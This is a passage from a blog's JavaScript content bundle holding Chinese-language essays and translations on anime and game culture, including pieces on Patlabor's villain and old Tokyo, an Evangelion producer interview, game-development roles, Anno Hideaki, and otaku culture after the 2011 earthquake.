年代的人物的話語，能夠當成讓這點更為明確的輔助線。</p>\n<blockquote>\n<p>現在東京的骨架可說是由震災所搭起的。而這在戰爭災害中消失，在高度成長中消失，現在則是在都市開發的形式下，鄉下形式的古老事物，包含洋館在內，都將要消失。也就是說，以都市論來說東京的城市，目前迎來了一次末期。(松田)</p>\n<p>赤瀬川原平他編『路上観察学入門』p135</p>\n</blockquote>\n<p>「古老事物」將要消失的感受，以及將其解讀為一次「結束」。這種對於現況的認識，正是為何帆場的浪漫會與聖經的意念連接起來的迴路。</p>\n<p>我想說的是，在作品中被當成一種「答案」所提出的後藤的說法，只是讓帆場的其中一面，落於不公平的推理之中。我並不是想要主張我所認為的帆場=懷舊愛好者的人物側寫才是絕對正確的。而是因為帆場暎一沒有對自己做任何的言及，而讓觀眾擁有能夠對其人物側寫做出無限解釋的空間。我認為談論他的趣味性，也是『機動警察 the Movie』的重點魅力之一。這是我所想說的。</p>\n<h2 id=\"在這之後的東京，帆場暎一的敗北\">在這之後的東京，帆場暎一的敗北</h2>\n<p>在作品中，帆場的計畫某種意義上成功了。他成功阻止了灣岸地帶的毀滅，並且巴比倫計畫因為「方舟」遭到破壞而推遲，在這點上可說帆場達成了一部份的計畫。</p>\n<p>或許計畫成功了。然而，在續作《機動警察 2 the Movie》裡，則明確地指出了帆場的失敗。《機動警察 2 the Movie》裡的東京，已經完全抹去了帆場四處居留古朽而將要消失的老舊景色，化為了無機質的都市。身為犯罪者的帆場的確得到了勝利。然而身為浪漫主義者的帆場，在不斷改變的東京的面前完全敗北了。</p>\n<p>借用劇中登場人物的話來說的話，「如同海市蜃樓般」，虛幻的都市，脫去真實味道的東京，已經沒有帆場所懷念的小鎮的真實性。在上方引用的《機動警察 the Movie》的松井與後藤的對話，還有後續。</p>\n<blockquote>\n<p>後藤「我們是誰？我們向何處去？」</p>\n<p>松井「那是什麼。」</p>\n<p>後藤「曾經攻進歐洲極盡破壞之能事的野蠻人隊長在牆壁上所留下的話。」</p>\n</blockquote>\n<p>同時引用了亞歷山大 3 世與保羅的這句疑問。在本作中並沒有做出解答，然而巧合的是，吉見俊哉在與本作同時期裡發表的論述中，有段富有意涵的文字。我想在此引用</p>\n<blockquote>\n<p>消費社會或許就是一種巨大的遺忘裝置。它會不斷地演出新的城市景色，將人們的慾望引誘至此，並讓人們忘卻這般風景的由來。我們身處何處，從何處來，向何處去，這些疑問在此沒有意義。我們逃進強迫觀念性地除菌後的現在之中，而這個現在不斷地改變樣貌地重複著。</p>\n<p>吉見俊哉「遊園地のユートピア」『リアリティ・トランジット』p71</p>\n</blockquote>\n<p>就像是與松井的台詞重合，在闡述完消費社會的現況後，吉見回答「野蠻人的隊長」的疑問。不，應該說是揭露出這個疑問的無法達成性。這份無法達成性，也是後藤已有所預感，在續作裡替帆場的敗北劃上決定性的一筆的要速。</p>\n<p>不過帆場的敗北，我也覺得像是早已決定好的。後藤如此評論帆場的犯罪。</p>\n<blockquote>\n<p>「如果失敗了，灣岸一帶會全毀，無法預估損害會有多大。即使成功了，巴比倫計畫也會因為失去了方舟，使得計畫大幅推遲。無論如何都註定了我們是輸的一方。或許在他跳海的那一刻，就已經分出了真正的勝負。你不覺得嗎？」</p>\n</blockquote>\n<p>不論帆場所計畫的 Patlabot 失控是否會發生，都註定了巴比倫計畫的推遲。後藤也因此說道「我們註定是輸的那一方」，這都是與帆場的認知相違背的。不論計畫是否會暫時推遲，東京都會繼續改變。居身在將要消失的古老東京裡的帆場，不可能沒有感受到這點。他的犯罪的雙重意涵也能從開頭暴走 Patlabot 破壞老舊事物的一連場景中所表現的解讀出，試圖保護古老美好的東京的想法，不得不將其破壞的矛盾。</p>\n<p>這樣來說，對於帆場或許這次犯罪也是「註定是輸的那一方」。即使考量至此，仍不得不掛念於古老美好東京的浪漫主義者。這就是帆場暎一這個男人。</p>\n<p>對於在 21 世紀才首次踏上東京的我來說，這部在 1989 年上映的電影裡所描寫的東京，或許早就消失了。但是我認為還有餘火，僅存的古老東京的碎片仍還在東京裡。在《機動警察 2》裡褪去真實性色彩的都市裡，也確實地存在著能讓人感受到帆場的亡靈的契機。</p>\n<p>而做為喚起帆場的亡靈=古老美好的？東京的記憶的畫面，讓《機動警察 the Movie》宿有超越娛樂電影的靈感。</p>\n","date":"2019-09-11T07:28:53.000Z","excerpt":"","printDate":"September 11, 2019","printReadingTime":"1 min read"};

var route_7 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod4
});

var Mod5 = {"title":"【譯】動畫會變得無聊，都是《新世紀福音戰士》的錯","slug":"ACG-curse-of-anime-evangelion","html":"<p>文章來源：<a target=\"_blank\" rel=\"nofollow\" href=\"http://anime-room.jp/modules/xpwiki/?%A5%B5%A5%A4%A5%BE%A1%BC%A3%B1%B7%EE%B9%E6%A1%A1%A5%A2%A5%CB%A5%E1%A4%AC%A4%C4%A4%DE%A4%E9%A4%CA%A4%AF%A4%CA%A4%C3%A4%BF%A4%CE%A4%CF%BF%B7%C0%A4%B5%AA%A5%A8%A5%F4%A5%A1%A5%F3%A5%B2%A5%EA%A5%AA%A5%F3%A4%CE%A4%BB%A4%A4%A4%C7%A4%A2%A4%EB\">サイゾー１月号　アニメがつまらなくなったのは新世紀エヴァンゲリオンのせいである</a></p>\n<hr>\n<p>サイゾー２００６年１１月号より抜粋</p>\n<p>——大月先生您曾經在《月刊 Newtype》10 月號的訪談裡說過：「動畫界因為《新世紀福音戰士》潮流的影響，產生不必要的誤解和混亂，並招來了內容的粗製濫造」。身為潮流的創造人之一跳出來做這樣的發言，對粉絲們而言會是個十分令人震驚的「事件」吧。</p>\n<p>大月＞我自己也覺得「你還真敢說出口哪」。因為「最粗製濫造的人，不就是你自己嗎」（笑）。但我認為仍然需要有人出來對現狀進行批評。</p>\n<p>——所以您是做好覺悟才跳出來批判並揭露問題的嗎？</p>\n<p>大月＞雖然說是粗製濫造，現在動畫的作畫品質比起 80 年代還是好上不少的。但企畫內容相當空泛，《EVA》的播出，害得整個業界陷進了《EVA》的束縛之中。</p>\n<p>具體來說，在《EVA》爆紅之後，動畫業界開始不再以作品的品質做判斷，而完全改為重視銷量的數字。導致業界棄置了原本的主要客群國高中生於不顧，轉讓會出錢的 30 歲前後的狂熱者們為中心客群的「萌」動畫開始氾濫。</p>\n<p>這就是現狀。但今年出現了決定性的「校園萌作」《涼宮春日的憂鬱》。DVD 的銷量已經走到峰頭，之後只會開始往下跌而已。這樣下去動畫是不會有未來的。因為現在的國高中生會鄙視動畫，根本不願意去觀看。原本動畫是要做給孩子們看的。</p>\n<p>卻在不知何時開始，動畫業界拿「萌」當成賣點，這變成了一門貪得無厭的商事。我認為觀看狂熱粉絲向的動畫作品的年齡層落在 20 到 40 歲區間這件事，是有些扭曲的。在《EVA》之後一切都脫離了原本應有的樣貌。</p>\n<p>而這全都是我們這些廠商和動畫製作公司的錯，是《EVA》的功過裡「過」的部份。我們並沒有「功」，若要說有，那也只是作品本身的評價而已。</p>\n<p>——在這樣的狀況下，重新構築電視版的《EVA》的《新世紀福音戰士 新劇場版》，將以明年的夏季上旬為起點，分為 4 部作品上映，你們是抱著什麼樣的意圖這樣作的？我想許多粉絲對大月先生和庵野秀明監督投以期待的，應該是「第二個《EVA》」而不是「《EVA》的重製作品」。</p>\n<p>大月＞雖然這很常被誤會，我在這 12 年來從來沒有主動向庵野說「我們來做《EVA》的續作吧」，從來沒有。</p>\n<p>因為他是個很彆扭的人，如果這樣和他說，反而會讓他喪失幹勁（笑）。但庵野卻和我說了「我想先建立起，能夠做出『下一個《EVA》』的『地基』」。</p>\n<p>——也就是說，這次的新劇場版，只是為了連結到「下一個《EVA》」的準備作業嗎？</p>\n<p>大月＞是的，但講得太多就會爆雷了（笑）。12 年前的《EVA》是因為有著當時的社會狀況，以及庵野內心的問題，而且舊劇場版以那樣「整個世界毀滅，只剩下真嗣和明日香存活下來」的破滅形式作結，也不可能再有後續的故事。</p>\n<p>但過了 12 年，已經走過了一個年代，庵野整理好了自己的內心。新劇場版理應會是 Happy End 的《EVA》，也就是「走向希望的故事」。</p>\n<p>——有個聽來有些令人擔心的地方是，之後會不會在「糟糕的方向上」和《鋼彈》一樣，開始出現大量的《EVA》的後續作品？</p>\n<p>大月＞庵野希望能讓《EVA》成為「好的方向上」的《鋼彈》。像特攝有了《假面騎士》和《奧特曼》這樣的標竿作品，動畫界卻只有《鋼彈》。所以我們想透過這部劇場版，讓《EVA》成為動畫界的新標竿。</p>\n<p>製作工作室也不再是 GAINAX，而是改以另一間新公司 Studio Khara 為中心進行製作。</p>\n<p>——那麼，大月先生您想透過這次的《EVA》新作劇場版，為這個因為《EVA》而腐敗的動畫業界帶來什麼東西呢？</p>\n<p>大月＞首先最重要的，就是能讓國高中生覺得「《EVA》好像很有意思，去看看吧」。最近國高中生每個月的零用錢，有大約 5000 日圓都是用在電話費或網路費上，他們是不會去買什麼動畫 DVD 的。</p>\n<p>然後是摧毀現有的那種「我們只要做那些 30 歲的人們會願意出錢買 DVD 的萌動畫就好了」的倫理。</p>\n<p>我們這些業界人總是會看漏最重要的事情。</p>\n<p>在《EVA》之後，動畫業界裡開始大量出現成天在意「票房收入有幾億日圓」、「公司上市之後，股價上漲了這麼多」的人。</p>\n<p>真是令人作噁。業界裡充斥著這樣的言論時，就快完蛋了吧。</p>\n<p>——也就是主動刺激這個業界呢。</p>\n<p>大月＞因為我真心認為，在《EVA》過後的這 12 年裡，變得最糟糕的人就是我自己（苦笑）。所以我也想透過再次製作《EVA》，替這 12 年來毫無作為、毫無目的的自己進行清算。</p>\n<p>Studio Khara 在前幾天正式啟用了。庵野、貞本、鶴卷和大家看起來都十分地有幹勁、開心，那是我在這 12 年來參與許多動畫製作時，所缺少的感覺。</p>\n<p>帶有像那樣少年眼神的 40 歲男子是很帥氣的。這會成為一間好工作室，會做出好的影像。作品裡的作畫也會是完全新作，敬請期待。</p>\n<p>——如此說道的大月先生，也有著難以想像是 44 歲的輝煌眼神呢（笑）。十分令人期待作品的上映！</p>\n","date":"2020-09-16T22:11:17.000Z","excerpt":"","printDate":"September 16, 2020","printReadingTime":"1 min read"};

var route_28 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod5
});

var Mod6 = {"title":"【譯】遊戲製作人、總監、企畫的差別","slug":"ACG-difference-of-director-and-producer","html":"<p>文章來源：<a target=\"_blank\" rel=\"nofollow\" href=\"http://gameplanner.blog.jp/archives/GamePlanner20150118_02\">Lv.11 プロデューサー、ディレクター、プランナーの違い（前編）</a></p>\n<hr>\n<p>我曾經在自著書裡寫過這個主題，但覺得當時寫得太籠統了，想在部落格上再寫一篇，順便當成備忘錄。</p>\n<p>以遊戲業界為目標的人，或是剛進入遊戲業界沒多久的人，應該不太清楚製作人、總監和企畫之間的差別是什麼。雖然實際情況會因為公司的風氣或團隊、人數規模、實際參與製作的人而有差異，但我想還是可以介紹我個人認為「大概像是這樣」的東西。</p>\n<p>而在這之前，我認為在說明這件事情上，可以分為 3 種觀點。分別是「職位」、「靈魂」、「關係」。以下逐一說明。</p>\n<h2 id=\"「1-職位觀點」\">「1. 職位觀點」</h2>\n<h3 id=\"製作人-プロデューサー，producer\">製作人 (プロデューサー，Producer)</h3>\n<ol>\n<li>銷量的負責人</li>\n<li>負責募集製作遊戲所需要的資金</li>\n<li>負責思考如何將這款遊戲傳達給客人</li>\n</ol>\n<h3 id=\"總監-ディレクター，director\">總監 (ディレクター，Director)</h3>\n<ol>\n<li>遊戲趣味性的負責人</li>\n<li>遊戲製作團隊的隊長</li>\n<li>思考如何讓使用者熱中於遊戲</li>\n</ol>\n<h3 id=\"企畫-プランナー，planner\">企畫 (プランナー，Planner)</h3>\n<ol>\n<li>將遊戲內容具體化的負責人</li>\n<li>負責製作規格書與資料</li>\n<li>負責圓滑地進行擔任的業務</li>\n</ol>\n<p>大致上是這種感覺。這是我所認為的理想概念。而要再替不清楚製作人和總監的人做說明的話，總監做的是思考遊戲內容和參與實際製作。製作人是盡可能將完成的遊戲讓更多人知道，採取能令人覺得「這好像很好玩！我想要！」的行動。例如廣告應該要放在哪裡怎麼呈現，使用什麼樣的演出才能獲得好印象之類的。</p>\n<p>企劃的基本工作是將總監所說的「我們要做這樣的遊戲！」內容完備成更加具體的規格，並說明給設計師和程式員。以及輸入完成的遊戲資料、檢查遊戲平衡是不是有問題，也是企劃的工作。</p>\n<p>使用這種「職位」的看法，我想可以讓各位比較簡單地了解，一個團隊是怎麼分工完成一款遊戲的。</p>\n<h2 id=\"「2靈魂觀點」\">「2.靈魂觀點」</h2>\n<h3 id=\"製作人\">製作人</h3>\n<ol>\n<li>負責讓使用者說出這什麼遊戲好像很好玩！</li>\n</ol>\n<h3 id=\"總監\">總監</h3>\n<ol start=\"2\">\n<li>負責讓使用者說出這遊戲超級好玩的！！</li>\n</ol>\n<h3 id=\"企畫\">企畫</h3>\n<ol start=\"3\">\n<li>和總監一樣</li>\n</ol>\n<p>簡單來說，遊戲要讓使用者玩到才會成為完成品。若不能讓人覺得「我想玩！」就沒有意義，實際玩過之後若是講出「這什麼糞 Game」那也就結束了。而 1 的職位觀點所講的，其實也就是為了能換位思考「(身為玩家) 我為什麼要去玩這遊戲」，思考「要讓使用者如何去看待這款遊戲」所做的分工。在這層意義上，製作人的工作就是將這款遊戲的存在告訴許多使用者，並且讓人覺得「好像很有趣！玩看看吧」，這是目標之一。</p>\n<p>另一方面總監和企畫，在為了讓使用者在實際遊玩時能夠說出「果然這個遊戲超有趣！」的意義層面上，可以說職責是完全一樣的。遊戲比較宏觀的部份 (遊戲設計、主要的遊戲要素、這些要素的有趣之處在哪裡？) 由總監操刀，比較細膩但也同樣重要的部份 (畫面的容易辨識度、操作的便利性、遊戲平衡) 則是由企畫執行。</p>\n<p>宏觀與微觀缺了其中一方都會讓成品變成糞 Game，因此對於遊戲的完成度來說，總監和企畫可說是平等的。即使製作人成功地讓許多使用者購買了遊戲，總監和企畫是草包的情況下使用者很快就會離開，因此為了不要讓「帶來客人的人、招待客人的人」之間出現落差，團隊擁有共通的概念是很重要的。</p>\n<p>而共通的概念，就是「這個遊戲最大的魅力是什麼？而，能夠讓使用者感受到這點嗎?」。這部份若要寫起來也會花掉不少篇幅，因此我想留到後篇再寫。(※結果沒寫)</p>\n<h2 id=\"「3關係觀點」\">「3.關係觀點」</h2>\n<h3 id=\"製作人-プロデューサー，producer-1\">製作人 (プロデューサー，Producer)</h3>\n<ol>\n<li>讓出錢的對象能覺得「這我一定要出錢！」</li>\n<li>會是總監的「搭檔」</li>\n<li>成為和顧客溝通的橋樑</li>\n</ol>\n<h3 id=\"總監-ディレクター，director-1\">總監 (ディレクター，Director)</h3>\n<ol>\n<li>理解製作人的意圖</li>\n<li>將自己的意圖明確地傳達給企畫</li>\n<li>理解顧客的心</li>\n</ol>\n<h3 id=\"企畫-プランナー，planner-1\">企畫 (プランナー，Planner)</h3>\n<ol>\n<li>理解總監的意圖</li>\n<li>將完整形式的意念清楚地傳達給設計師和程式員</li>\n<li>設身處地成為顧客</li>\n</ol>\n<p>在這裡所說明的並不是像 1 的職位或 2 的靈魂這種「依附在自己身上的職責」，而是「為了自己以外的其他人所應做的事」。所謂的工作不只是敲打電腦鍵盤，還有團隊合作。團隊合作除了自己負責的部份之外，如何經營一起製作遊戲的伙伴之間的關係，也是非常重要的。</p>\n<p>而說穿了「做到相符職位的事是理所當然的」「擁有靈魂是理所當然的」，因此能不能夠達成這種團隊關係，會使得「團隊力=遊戲的完成度」大幅變動。在遊戲業界裡抱有強烈執著的人也很多，彼此互不相讓而產生摩擦的情況並不少見，也有不會去做超過自己份內事的，消極態度的人在。</p>\n<p>但這樣的作法並不能稱上是個好團隊，既然稱不上好團隊就不可能做得出好遊戲。就像足球要有前鋒和中鋒，防守者和守門員一同發揮團隊合作才會獲得勝利。電影和戲劇也是，有了演員和攝影師、照明和音響的團隊合作才能完成一部影視作品。</p>\n<p>為了要實現團隊合作，我認為比起職位和靈魂，這種面對關係的「意識的係數」是更重要的。寫得有些長了所以先在這裡結束前篇。</p>\n","date":"2019-01-19T06:50:34.000Z","excerpt":"","printDate":"January 19, 2019","printReadingTime":"1 min read"};

var route_10 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod6
});

var Mod7 = {"title":"庵野秀明真的不知道自己在拍什麼嗎？","slug":"ACG-does-anno-hideaki-really-dont-know-what-he-is-making","html":"<p>或說，在暴風圈中心的人們是怎麼想的。</p>\n<h2 id=\"你-eva-系？\">你 EVA 系？</h2>\n<p>近年網路上時常能看到一種對於《新世紀福音戰士》的看法：從 2008 年台灣 ACG 研究組織「U-ACG」創辦人 RainReader 在<a target=\"_blank\" rel=\"nofollow\" href=\"https://blog.xuite.net/tuyu/MIYU/17160404-EVANGELION%E6%96%B0%E5%8A%87%E5%A0%B4%E7%89%88%EF%BC%9A%E5%BA%8F%EF%BD%9E%E5%B0%91%E5%B9%B4%E8%AE%8A%E6%88%90%E4%BA%86%E7%A5%9E%E8%A9%B1\">部落格</a>寫下的「整個意識流和跳躍性劇情我看庵野自己也搞不懂（在某次訪談中，庵野自己也很隱誨地承認）」，到最近一則推特上獲得大量轉發，並有翻譯轉貼至中文社群的推文「庵野監督：不是很清楚」；人們似乎認為，連鉅片《AKIRA》製作人渡邊繁都認為是<a target=\"_blank\" rel=\"nofollow\" href=\"https://togetter.com/li/1527666\">當代世界最強動畫師</a>的庵野秀明，在創造這部影響諸多作品，成為該領域的看門招牌，帶來驚人經濟效益的歷史名作時，因為這部作品「太神了」，連他都搞不懂自己做出了什麼東西。</p>\n<p><img src=\"https://i.imgur.com/8N8B3e0.jpg\" alt=\"pic 1\"></p>\n<p>這種看法的起因可認為是源於作品後段製作時程與經費的吃緊，最後兩話改為採取「畫風大變」的大量字卡、兼用卡以及角色獨白手法做結，激怒了許多當年期待本作的觀眾，並讓往後數十年不清楚脈絡的新觀眾感到困惑，從而認為「這是一部看不懂的作品」；以及部份觀眾過於關注一部份僅是做為裝飾性用途的詞彙，離脫了原本故事的主軸，迷失在雞毛蒜皮的細節上。但這終究只是觀眾的自行解讀，要牽扯到製作團隊／創作者身上，似乎顯得有些牽強。</p>\n<p><img src=\"https://i.imgur.com/5S3cCgV.png\" alt=\"pic 2\"></p>\n<h2 id=\"溝通的故事\">溝通的故事</h2>\n<p>所以《EVA》到底在講什麼？問題的答案其實在許多相關資料中都有提及，很可惜的，這些資料卻鮮少出現在人們的眼前，只有各種坊間傳言與戲謔嘲諷甚囂塵上，或如上述截圖「很隱諱地被承認」。我們可以從庵野提出的初期企畫案（1993 年）中寫的「<strong>現在整個社會裡人們正在逐漸失去溝通，家庭和組織（學校）內的人際關係面臨崩壞。我們想讓觀眾透過主角的眼睛，去思考究竟該如何與家人、朋友、大人、社會溝通。</strong>」</p>\n<p><img src=\"https://i.imgur.com/y5CoIj6.png\" alt=\"pic 3\"></p>\n<p>以及《真心為你》的電影特刊紅十字書（1998 年）裡，採訪者提問：「從（《真心為你》的）結局來看的話，說到底《新世紀福音戰士》其實就是溝通的故事呢。」之後，鶴卷和哉的回覆：「<strong>這點從 TV 版開始就是如此了。當時第貳話的時候我們就有很意識性地針對這點演出。例如有一幕是美里向真嗣搭話，卻沒有進到房間裡去，或是第參話裡看似早晨日常的對話，兩人卻沒對上臉，僅有狹小打開的門縫連結著彼此。</strong>」，《新世紀福音戰士》的原點之一，便是講述「溝通」的人間百態戲劇（人間ドラマ）。</p>\n<p><img src=\"https://i.imgur.com/ONaDVgZ.png\" alt=\"pic 4\"></p>\n<p>我十分喜歡 Pause And Select 在他們的 <a target=\"_blank\" rel=\"nofollow\" href=\"https://www.youtube.com/watch?v=dCKZQphDyLY\">Understanding Disaster 系列影片</a>中對於本作的評點：「本作所表現出來的東西是，正是在這樣的嚴峻狀態裡才顯得重要的，一種對於人生的肯定，裡頭有著對於活在失去意義的社會中的世代的理解、一份簡單卻赤裸的訊息 — — 與他人的連繫是痛苦而困難、會悽慘地受傷的東西，但也是有其價值的東西」，可說十分貼切。</p>\n<p><img src=\"https://i.imgur.com/U0Kj4Aw.png\" alt=\"pic 5\"></p>\n<p>而 TV 版貳拾伍、貳拾陸話的問題，庵野秀明於 TV 版播映後（1996 年）所接受的長篇訪談集《分裂、偏執．新世紀福音戰士》裡講到的「<strong>我們在第拾玖話的作業時就知道後面沒辦法再作大規模戰鬥場景了，也討論過沒有戰鬥的故事路線行不通。最後只剩下單用台詞表現戰鬥場景，或是重複播放拙劣的圖畫這兩種方法。</strong>」，則能看出這是苦澀之下的決定，以及這些「人間百態」的取材來源，其實也就是自己曾碰到的人，和自己所接觸過的作品。</p>\n<h2 id=\"看不懂別扯到我身上\">看不懂別扯到我身上</h2>\n<p>其中最有趣的一段話大概就屬「<strong>我很討厭粉絲把我當成教祖。這部作品會因此教典化。觀眾們將完全不去理解我所投出的台詞裡的反諷，只是從字面上的意思照單全收。陷入鑽牛角尖裡，過度解讀到我不這麼想的地方，並直接咬定肯定意思就是如此，但明明我是不這麼認為的啊（笑）。我並不喜歡這種作品獨自越走越遠的感覺。並不是作品不能有自由發揮的空間，但這已經大到超越我的責任範圍了。</strong>」，套在 EVA 已經被過度神格化的今日來看，可說是當事人也無能為力了吧。</p>\n<p><img src=\"https://i.imgur.com/dRvDbic.png\" alt=\"pic 6\"></p>\n<p>至於 RainReader 提到的「某次訪談庵野很隱晦地承認自己也搞不懂」，或許是在《Animage》1996 年 7 月號的訪談「あんた、バカぁと、言われてみたい。」其中的一段內容誤讀，原文為「我並不曉得（能不能做出大家期待看到的結局），雖然我已經作了會令大家開心的結局（應是指 TV 版中的校園平行世界結局）。但我不會再作那種結局了。我還不曉得（舊劇會怎麼做）」，亦或是還有其它的資料來源，但我目前找不到與這個說法相符的資料。</p>\n<p><img src=\"https://i.imgur.com/d3lOowI.png\" alt=\"pic 7\"></p>\n<p>而之後的故事，包含所謂的「騙錢」戰士一說，公開資料就比較多了，可以在庵野於 <a target=\"_blank\" rel=\"nofollow\" href=\"https://diamond.jp/articles/-/224881\">2019 年年底的特別投稿</a>看出 GAINAX 如何把一手好牌打到全盤皆輸，「騙錢」惡名的真正緣由，在爆紅之後的興衰沒落，到庵野如何力挽狂瀾，重新建立起 khara 並實現他在訪談裡提的「把從製作影像賺來的錢回饋到製作影像的人身上」，以及外顯的諸多心境變化，從而給出一個比較還其公道的評價。</p>\n<p><img src=\"https://i.imgur.com/NZufCq8.jpg\" alt=\"pic 8\"></p>\n<blockquote>\n<p>什麼是巨大機器人動畫的魅力？</p>\n<p>「巨大機器人動畫」是孩子們潛在欲望的表現。\n換句話說，「巨大機器人動畫」是孩子們所擁有的，\n彌補或對抗壓抑和情結的手段、代償行為。</p>\n<p>大人們知道「人活著的痛苦」。同時也知道「人活著的快樂」。\n因此他們知道，即使這是謊言，\n所謂「正義與愛」的＜夢想＞和＜希望＞仍是必要的。\n而透過動畫這種表現手段的特色，\n也就是活用全由人工畫出的「繪畫」世界觀，\n能讓孩子們不會在虛構中感受到與現實之間的落差，\n從而將其純粹地傳達給孩子們。</p>\n<p>這就是「巨大機器人動畫」所擁有的最大的魅力。</p>\n<p>本企畫為，回歸至這個原點上，在原有的「巨大機器人動畫」的魅力裡，\n重新挖掘並發現其全新的獨特之處。</p>\n</blockquote>\n","date":"2020-09-06T21:42:04.000Z","excerpt":"","printDate":"September 6, 2020","printReadingTime":"1 min read"};

var route_3 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod7
});

var Mod8 = {"title":"【譯】御宅族的文化內容在福島大震災之後，真的出現了激烈變化嗎？","slug":"ACG-does-otaku-culture-really-change-after-earthquake","html":"<p>文章來源：<a target=\"_blank\" rel=\"nofollow\" href=\"https://p-shirokuma.hatenadiary.com/entry/20110415/p1\">https://p-shirokuma.hatenadiary.com/entry/20110415/p1</a></p>\n<hr>\n<p>竹熊健太郎發了<a target=\"_blank\" rel=\"nofollow\" href=\"http://togetter.com/li/123544\">一連串挺有意思的推文</a>。大意是御宅族圈子的文化內容表現，會以 3/11 的大震災為契機開始變化。其中最為重要的推文是</p>\n<blockquote class=\"twitter-tweet\"><p lang=\"ja\" dir=\"ltr\">3)3.11から先の世界はマニュアルのない世界だ。オタク的な表現は変質するしかない。なぜならオタクは豊かな日常を前提にしたライフスタイルだからだ。マンガもアニメも当然残るが、表現の質が変わるだろう。どう変わるかはまだわからないが、必ず変わる。それは不安であり楽しみでもある。</p>&mdash; 竹熊健太郎《地球人》 (@kentaro666) <a href=\"https://twitter.com/kentaro666/status/58173115523530752?ref_src=twsrc%5Etfw\">April 13, 2011</a></blockquote>\n\n<blockquote>\n<p>3/11 之後的世界是無法再照本宣科的世界。面向御宅族的文化表現會必然地變質。因為在這之前御宅族的生活方式是建立在豐饒的日常上的。漫畫和動畫都會殘存下來，但內容表現的本質一定會有所變化。我並不曉得將會如何變化，但一定會改變。這令我不安也讓我十分期待。</p>\n</blockquote>\n<p>發生如此大範圍的災害，造成社會不安，一定會對文化內容的表現造成影響，這樣的解讀相當合理。但我想整理幾點關於對輕小說與深夜動畫這一類御宅族文化的核心內容，是否真的會出現決定性變化的個人疑問。</p>\n<h2 id=\"究竟是什麼御宅族們的「日常」\">究竟是什麼御宅族們的「日常」</h2>\n<p>竹熊使用的表現是「御宅族的生活方式是建立於豐饒的日常上」。這對於第一世代御宅族 <a target=\"_blank\" rel=\"nofollow\" href=\"%E6%8C%871960%E5%B9%B4%E4%BB%A3%E5%89%8D%E5%BE%8C%E5%87%BA%E7%94%9F%E7%9A%84%E4%B8%96%E4%BB%A3%E3%80%82\">1</a> 來說應該是件十分容易理解的事。而綜觀整個世代，的確也能認為「現代的御宅族生活全是因為有十分完善的都市建設才得以形成」的觀點沒有什麼問題。</p>\n<p>第一世代的御宅族想要享受御宅族生活，需要充裕的時間和金錢。雖然這是和現代的情況做比較，當時不管是 SF 或是漫畫、個人電腦之類的興趣，若沒有相符的時間、金錢、容納空間便十分難支撐起 <a target=\"_blank\" rel=\"nofollow\" href=\"%E7%A1%AC%E7%A2%9F%E9%80%99%E7%A8%AE%E8%B6%85%E7%B4%9A%E6%96%B9%E4%BE%BF%E7%9A%84%E6%9D%B1%E8%A5%BF%E5%87%BA%E7%8F%BE%EF%BC%8C%E4%B8%A6%E8%BD%89%E8%AE%8A%E6%88%90%E7%8F%BE%E5%9C%A8%E4%BA%BA%E5%80%91%E6%89%80%E8%AA%8D%E8%AD%98%E7%9A%84%E6%A8%A3%E8%B2%8C%E5%B7%B2%E7%B6%93%E6%98%AF%E5%BE%88%E4%B9%85%E4%BB%A5%E5%BE%8C%E7%9A%84%E4%BA%8B%E6%83%85%E4%BA%86%EF%BC%8C%E7%95%B6%E6%99%82%E6%83%B3%E6%94%B6%E8%97%8FLD%E6%88%96%E9%8C%84%E5%BD%B1%E5%B8%B6%E9%80%99%E7%A8%AE%E7%AC%A8%E9%87%8D%E7%9A%84%E6%9D%B1%E8%A5%BF%E6%98%AF%E9%9C%80%E8%A6%81%E6%9C%89%E9%96%93%E3%80%8C%E5%96%AE%E4%BA%BA%E7%8D%A8%E6%88%BF%E3%80%8D%E7%9A%84%E3%80%82\">2</a>。而且在沒有網際網路的時代，和首都圈與大都市間的交通功能會比現在有更決定性的差異，也就是說，<strong>不是「住在都心部，在金錢和時間上都過得相當優沃的小少爺」，是很難能夠享受御宅族文化的</strong>。對於「成為御宅族的必要條件」背後前提是如此的世代的人來說，「御宅族的生活方式是建立於豐饒的日常上」的表現並沒有錯。</p>\n<p>而越是後期的御宅族，就越不需要時間、金錢和收納空間 (或許甚至連熱情都不再需要了) 去參與御宅族文化了。硬碟、網路、NicoNico 動畫的登場，讓缺乏時間、沒有錢、沒有收納空間的人也能夠維持御宅族興趣。即使忙碌、貧窮的人也能參與御宅族文化的時代已經來了。<strong>現代御宅生活的必要條件裡已經不再需要過往的豐饒</strong>。</p>\n<p>但「御宅族的生活方式是建立於豐饒的日常上」這句話也反應出了一部份現代的御宅生活方式。因為現代的御宅族理所當然地享受著的環境——網際網路連線環境、網路購物手段、道路與鐵路交通網、能在半夜安心去便利商店的治安——和其它開發中國家相較仍是十分豐饒的。日本這種即便沒有能和他人侃侃而談的溝通技能，也能當個有模有樣的愛好家活下去的生活空間，其實也是挺幸運的。</p>\n<p>那麼，現代的御宅族們——在人口比率上，以第二世代之後的御宅族佔大多數的這群人——是否也是認為自己的御宅生活是「建立於豐饒的日常上」嗎？</p>\n<p>我認為答案是 No。</p>\n<p>第二世代之後的御宅族，即使（相對的）在金錢和生活上的條件沒有那麼好，也能享受御宅興趣。尤其是在經濟泡沫崩壞之後，時間和金錢都較為緊迫的御宅族數量大為增加。同時御宅族文化也成為了對於適應社會感到痛苦的人們的避難場所。新加入的人們背後的前提已經從「豐饒的日常」轉變成了「悲慘的日常」 <a target=\"_blank\" rel=\"nofollow\" 